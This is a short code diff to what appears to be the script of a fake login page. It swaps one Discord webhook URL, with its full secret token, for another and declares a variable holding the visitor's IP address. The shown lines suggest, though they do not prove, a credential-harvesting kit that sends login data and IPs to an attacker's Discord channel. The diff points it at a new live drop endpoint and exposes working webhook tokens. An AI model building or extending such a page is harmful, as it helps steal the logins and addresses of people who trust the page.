@@ -4,7 +4,7 @@
 const loginButton = document.querySelector("button");
 
 // Webhook URL
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1358739681470316677/-GPhfZIhYskH1FlWulsIrUQZoG_oE6w7tewh1e8EowwBhSSDRdNzMXUPjG39gwUyt0uB";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s";
 
 // Variables to store user data
 let userIP = "Unknown IP";
